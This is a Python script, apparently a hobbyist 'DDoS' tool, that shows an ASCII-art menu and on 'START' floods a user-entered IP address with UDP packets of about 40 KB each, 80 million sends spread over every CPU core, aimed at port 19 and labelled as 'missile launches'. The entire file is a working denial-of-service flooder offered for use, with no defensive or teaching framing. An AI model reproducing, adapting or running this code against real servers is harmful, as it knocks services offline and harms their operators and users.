import socket
import os
import multiprocessing

# ASCII Art
ascii_art = """
               :::::.                                                                               
              .!:~:!!:::..                                                                          
              :~ ^ ~!:::..::..                                                                      
              ^^ ^ ~~  .:::.^~~!.                                                                   
              ~^:~.!~     ~:^^^^^^:.                                                                
              ~:.^ ~!.    ^  .:::::^^^:.                                                            
              ~ .^ ~!.    ^     ^^::..:^!~:.   ...                                                  
             .!.:^ ~:77^^^^^!^^^^^~~^^^~~!~~!!~~~!7?!^:::^~^.:.^.                                     
   :^..^~^^7~~^^~^!^^^^^~^:^^^^^~!^^!!!~::~~~~:. 77?77^^^!^^^?7^^^^^:^^:^~^.:....... ...            
 .^!^::~~^^7?7:.:^^.::.^?^::^~~~77::~?!^..^^^^:..!::::~^^~.:7~.....!J!!7J7~ ^:.......~~^~^:.......  
 :~7^::~~^^7?!.::^^..:.^?^.:^~~^77::^7~:..^^^^:..~::::~^^~.:7~.....!J!!7J7~ ^: ......~~:~!~^^^^^~^  
   :~::~~~~7~~~^~~!^^^^^~^^^^^^^~!^^!77!^:~~~~:..77?77^^^!^^^??~~~~!~~~~!7~:^^::::::::^:.           
         ....^!:^~:77:^^^^!^^^^^~~^^^~~!~~!!~~~~7?!^:^^^!~:::~.                                     
             .!.:^ ~!.    ^     :.  ::!?^:.  .^~7~. :::.                                            
             .!.:^ ~?~::::^     :. .~~^~:.:^~^^7!:^:.                                               
              ! .^ ~?~^^^^^     ^^::..:^!~^:. .::.                                                  
              ~:.^ ~!.    ^  .:::::^~~^:.                                                           
              ~^:~.!~    .~:^^^~~^^:.                                                     
              ^^.^ ~~  .::..^~!!:                                                     
              :~ ^ ~!::::::::.                                                    
              .!:~:7!:^::.                                                  
               ^^:::..    
"""

# Function to send UDP requests
def send_udp_request(ip, port):
    try:
        server_ip = ip
        server_port = port
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Send a heavier payload
        payload = b'Missile Launch Code: 12345678901234567890' * 1000  # Send a longer message
        client_socket.sendto(payload, (server_ip, server_port))
        print("Missile Launched!")

    except Exception as e:
        print(f"Error sending UDP request: {str(e)}")

# Function to send a large number of UDP requests using multiprocessing
def send_large_number_of_requests(ip, port, num_requests):
    with multiprocessing.Pool(processes=multiprocessing.cpu_count()) as pool:
        pool.starmap(send_udp_request, [(ip, port)] * num_requests)

# Function to display legal and credits information
def display_legal_and_credits():
    os.system('clear' if os.name == 'posix' else 'cls')  # Clear the screen based on the OS
    print("LEGAL INFORMATION AND CREDITS")
    print("------------------------------")
    print("This software is provided as is, with no warranty or guarantee.")
    print("Use at your own risk.")
    print("\nCREDITS")
    print("-------")
    print("Developed by [galactic Workers]")
    print("Contact: [galacticworkers@gmail.com]")
    print("\nCopyright © 2023 [Galactic Workers]")

# Main function
def main():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')  # Clear the screen based on the OS
        print(ascii_art)
        print("WELCOME To kfir d")
        print("-----------")
        print("1. START")
        print("2. LEGAL AND CREDITS")
        print("3. EXIT")
        
        choice = input("Select an option (1/2/3): ")
        
        if choice == "1":
            server_ip = input("Please enter the server's IP address: ")
            server_port = 19  # You can change the port as needed
            num_requests = 80000000  # 80 million requests
            
            send_large_number_of_requests(server_ip, server_port, num_requests)
            
            print("All Missiles Launched!")
        elif choice == "2":
            display_legal_and_credits()
            input("\nPress Enter to continue...")
        elif choice == "3":
            print("Exiting the program.")
            exit()
        else:
            print("Invalid option. Please choose from the available options.")

if __name__ == "__main__":
    main()



